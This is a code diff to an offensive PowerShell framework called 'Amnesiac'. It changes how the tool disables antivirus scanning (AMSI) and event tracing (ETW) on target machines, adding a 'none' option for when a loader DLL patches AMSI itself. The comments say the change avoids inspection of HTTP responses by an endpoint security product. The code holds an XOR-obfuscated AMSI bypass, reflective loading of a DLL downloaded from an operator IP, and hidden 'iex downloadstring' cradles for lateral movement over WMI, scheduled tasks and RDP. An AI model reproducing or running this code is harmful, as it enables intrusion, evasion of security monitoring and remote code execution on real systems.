@@ -76,6 +76,10 @@ function Get-AmsiBypassSnippet {
             )
         }
 
+        'none' {
+            return ''
+        }
+
         default {
             return Get-AmsiBypassSnippet -Technique 'pageguard'
         }
@@ -120,6 +124,10 @@ function Get-EtwBypassSnippet {
 
         'thread' {
             return Get-EtwBypassSnippet -Technique 'provider'
+        }
+
+        'none' {
+            return ''
         }
 
         default {
@@ -1069,15 +1077,16 @@ function Amnesiac {
 			$subcmd = $sub[0]; $val = if ($sub.Count -ge 2) { $sub[1] } else { $null }; $extra = if ($sub.Count -ge 3) { $sub[2] } else { $null }
 			switch ($subcmd) {
 				'amsi' {
-					if ($val -in 'pageguard','hwbp','fail','direct') {
+					if ($val -in 'pageguard','hwbp','fail','direct','none') {
 						$global:PayloadConfig.Amsi = $val
 						$global:Message = " [+] Payload AMSI bypass: $val"
 						if ($val -in 'pageguard','hwbp') { $global:Message += " (GetProcAddress AmsiScanBuffer patch)" }
-					} else { $global:Message = " [-] Valid: pageguard hwbp fail direct" }
+						if ($val -eq 'none') { $global:Message += " (disabled — use when DLL pre-patches AMSI)" }
+					} else { $global:Message = " [-] Valid: pageguard hwbp fail direct none" }
 				}
 				'etw' {
-					if ($val -in 'provider','patch','thread') { $global:PayloadConfig.Etw = $val; $global:Message = " [+] Payload ETW: $val" }
-					else { $global:Message = " [-] Valid: provider patch thread" }
+					if ($val -in 'provider','patch','thread','none') { $global:PayloadConfig.Etw = $val; $global:Message = " [+] Payload ETW: $val$(if($val -eq 'none'){' (disabled)'})" }
+					else { $global:Message = " [-] Valid: provider patch thread none" }
 				}
 				'launcher' {
 					if ($val -in 'ps','wmi','schtask','com') { $global:PayloadConfig.Launcher = $val; $global:Message = " [+] Payload launcher: $val" }
@@ -3202,13 +3211,19 @@ while (`$true) {
 			if ($AmnesiacLoaderB64 -and $_alByp -and $_alPar) {
 				try { [System.IO.File]::WriteAllBytes((Join-Path $global:AmnesiacRoot $_dllFile), [Convert]::FromBase64String($AmnesiacLoaderB64)) } catch {}
 				$_srvAmsi = "`$_a=[Reflection.Assembly]::Load((New-Object Net.WebClient).DownloadData('http://$_srvIP`:8080/$_dllFile'));`$_a.GetType('$_alNs.$_alByp').GetMethod('$_alPar').Invoke(`$null,`$null)"
+				# DLL pre-patches AMSI — pipe script served over HTTP needs no bypass code
+				# (bypass strings in HTTP responses are inspected independently by CS network driver)
+				$_liteConfig = @{} + $global:PayloadConfig
+				$_liteConfig.Amsi = 'none'; $_liteConfig.Etw = 'none'; $_liteConfig.Sbl = $false
+				$_servePS = (New-PayloadScript -ComputerName $ComputerName -PipeName $PipeName -Config $_liteConfig).InlinePS
 			} else {
 				$_srvAmsi = "try{`$_k=13;`$_u=[psobject].Assembly.GetType([string]::new([char[]]([byte[]](94,116,126,121,104,96,35,64,108,99,108,106,104,96,104,99,121,35,76,120,121,98,96,108,121,100,98,99,35,76,96,126,100,88,121,100,97,126)|%{`$_-bxor`$_k})));`$_u.GetField([string]::new([char[]]([byte[]](108,96,126,100,68,99,100,121,75,108,100,97,104,105)|%{`$_-bxor`$_k})),'NonPublic,Static').SetValue(`$null,`$true)}catch{}"
+				$_servePS = $built.InlinePS
 			}
 			$_srvCradle = "iex(new-object net.webclient).downloadstring('http://$_srvIP`:8080/$_pipeFile')"
 			$_srvCmd    = "powershell -nop -ep bypass -w hidden -c `"$_srvAmsi;$_srvCradle`""
 			$global:LastInlinePS = $built.InlinePS
-			[System.IO.File]::WriteAllText($_pipePath, $built.InlinePS, (New-Object System.Text.UTF8Encoding $False))
+			[System.IO.File]::WriteAllText($_pipePath, $_servePS, (New-Object System.Text.UTF8Encoding $False))
 			$_serveOk = $false
 			try { $_t = [Net.Sockets.TcpClient]::new(); $_t.Connect('127.0.0.1', 8080); $_t.Close(); $_serveOk = $true } catch {}
 			Write-Output " [1] Inline PS -- paste into existing PS session on target:"
@@ -3451,15 +3466,20 @@ while (`$true) {
 		if ($AmnesiacLoaderB64 -and $_alByp -and $_alPar) {
 			try { [System.IO.File]::WriteAllBytes((Join-Path $global:AmnesiacRoot $_dllFile), [Convert]::FromBase64String($AmnesiacLoaderB64)) } catch {}
 			$_rdpAmsi = "`$_a=[Reflection.Assembly]::Load((New-Object Net.WebClient).DownloadData('http://$_operatorIP`:8080/$_dllFile'));`$_a.GetType('$_alNs.$_alByp').GetMethod('$_alPar').Invoke(`$null,`$null)"
+			# DLL pre-patches AMSI — serve the pipe script without any bypass code
+			$_liteConfig = @{} + $global:PayloadConfig
+			$_liteConfig.Amsi = 'none'; $_liteConfig.Etw = 'none'; $_liteConfig.Sbl = $false
+			$_servePS = (New-PayloadScript -IsServer -PipeName $PN -SID $stealthSID -Config $_liteConfig).InlinePS
 		} else {
 			$_rdpAmsi = "try{`$_k=13;`$_u=[psobject].Assembly.GetType([string]::new([char[]]([byte[]](94,116,126,121,104,96,35,64,108,99,108,106,104,96,104,99,121,35,76,120,121,98,96,108,121,100,98,99,35,76,96,126,100,88,121,100,97,126)|%{`$_-bxor`$_k})));`$_u.GetField([string]::new([char[]]([byte[]](108,96,126,100,68,99,100,121,75,108,100,97,104,105)|%{`$_-bxor`$_k})),'NonPublic,Static').SetValue(`$null,`$true)}catch{}"
+			$_servePS = $built.InlinePS
 		}
 		$_rdpCradle   = "iex(new-object net.webclient).downloadstring('http://$_operatorIP`:8080/$_pipeFile')"
 		$_sharpRDPCmd = "command=powershell -nop -ep bypass -w hidden -c `"$_rdpAmsi;$_rdpCradle`""
 		$_srvCmd      = "powershell -nop -ep bypass -w hidden -c `"$_rdpAmsi;$_rdpCradle`""
 		# Write pipe file to disk for serve-based delivery (option 2) and SharpRDP last-resort.
 		# winrm delivery uses $global:LastInlinePS directly — no serve or disk file needed.
-		[System.IO.File]::WriteAllText($_pipePath, $built.InlinePS, (New-Object System.Text.UTF8Encoding $False))
+		[System.IO.File]::WriteAllText($_pipePath, $_servePS, (New-Object System.Text.UTF8Encoding $False))
 		$global:LastSharpRDPB64 = $_sharpRDPCmd
 		$global:LastSharpRDPCradleFile = $_pipeFile
 		$global:LastInlinePS = $built.InlinePS
